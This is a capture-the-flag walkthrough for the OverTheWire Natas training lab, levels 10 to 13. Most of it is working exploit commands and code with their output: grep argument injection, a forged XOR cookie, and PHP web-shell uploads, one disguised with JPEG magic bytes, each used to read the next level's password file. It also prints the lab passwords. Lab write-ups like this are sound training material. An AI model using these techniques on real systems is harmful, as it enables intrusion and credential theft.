# Natas

## level 10

```php
// http://natas10.natas.labs.overthewire.org/index-source.html
<?php
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
```

This level only check whether the input contains character ```;```, ```|``` and ```&```.

```
$ curl -u natas10:nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu http://natas10.natas.labs.overthewire.org/ -F 'needle=. /etc/natas_webpass/natas11 #' -F 'submit=Search'
```

```
U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
```

## level 11

```php
// http://natas11.natas.labs.overthewire.org/index-source.html
<?php
$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

function loadData($def) {
    global $_COOKIE;
    $mydata = $def;
    if(array_key_exists("data", $_COOKIE)) {
    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
        $mydata['showpassword'] = $tempdata['showpassword'];
        $mydata['bgcolor'] = $tempdata['bgcolor'];
        }
    }
    }
    return $mydata;
}

function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}

$data = loadData($defaultdata);

if(array_key_exists("bgcolor",$_REQUEST)) {
    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
        $data['bgcolor'] = $_REQUEST['bgcolor'];
    }
}

saveData($data);
?>
```

```
$ curl -u natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK http://natas11.natas.labs.overthewire.org/ -c cookie.txt
```

We get the cookie and we konw what the cookie means, so we kan get the ```key``` in function ```xor_encrypt```.

```python
#!/usr/bin/env python3
import base64
import urllib.parse

with open('cookie.txt', 'r') as f:
    cookie = f.readlines()[-1].split('\t')[-1]
cookie = urllib.parse.unquote(cookie)
cookie = base64.urlsafe_b64decode(cookie)

text = b'{"showpassword":"no","bgcolor":"#ffffff"}';

key = ''

for i in range(len(text)):
    key += chr(text[i]^cookie[i])

print(key)
```

Let's construct a new cookie with the ```key```.

```php
<?php
function xor_encrypt($in) {
    $key = 'qw8J';
    $text = $in;
    $outText = '';
 
    for($i=0;$i<strlen($text);$i++) {
        $outText .= $key[$i % strlen($key)] ^ $text[$i];
    }
 
    return $outText;
}
 
$defaultdata = '{"showpassword":"yes","bgcolor":"#ffffff"}';
echo base64_encode(xor_encrypt($defaultdata));
?>
```

```
$ curl -u natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK http://natas11.natas.labs.overthewire.org/ -b 'data=ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK'
```

```
The password for natas12 is EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
```

## level 12

This level we can upload a file without type checking.

```
$ curl -u natas12:EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3 http://natas12.natas.labs.overthewire.org/
```

```
<form enctype="multipart/form-data" action="index.php" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
<input type="hidden" name="filename" value="mx7ozjvm3x.jpg" />
Choose a JPEG to upload (max 1KB):<br/>
<input name="uploadedfile" type="file" /><br />
<input type="submit" value="Upload File" />
</form>
```

Create a file ```ving.php```.

```php
<?php
passthru("cat /etc/natas_webpass/natas13");
?>
```

```
$ curl -u natas12:EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3 http://natas12.natas.labs.overthewire.org/ -F 'filename=mx7ozjvm3x.php' -F 'uploadedfile=@ving.php'
```

```
The file <a href="upload/vimpzt7smb.php">upload/vimpzt7smb.php</a> has been uploaded
```

```
$ curl -u natas12:EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3 http://natas12.natas.labs.overthewire.org/upload/vimpzt7smb.php
jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
```

## level 13

This level checks whether the file is an image using ```exif_imagetype``` function before receive it.
So we create a file looks like an image.

```
$ echo -e '\xff\xd8\xff\xe0<?passthru("cat /etc/natas_webpass/natas14");?>' > ving.php
```

```
$ curl -u natas13:jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY http://natas13.natas.labs.overthewire.org/ -F 'filename=mx7ozjvm3x.php' -F 'uploadedfile=@ving.php'
```

```
The file <a href="upload/6xyuj68rtk.php">upload/6xyuj68rtk.php</a> has been uploaded
```

```
$ curl -u natas13:jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY http://natas13.natas.labs.overthewire.org/upload/6xyuj68rtk.php
Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
```
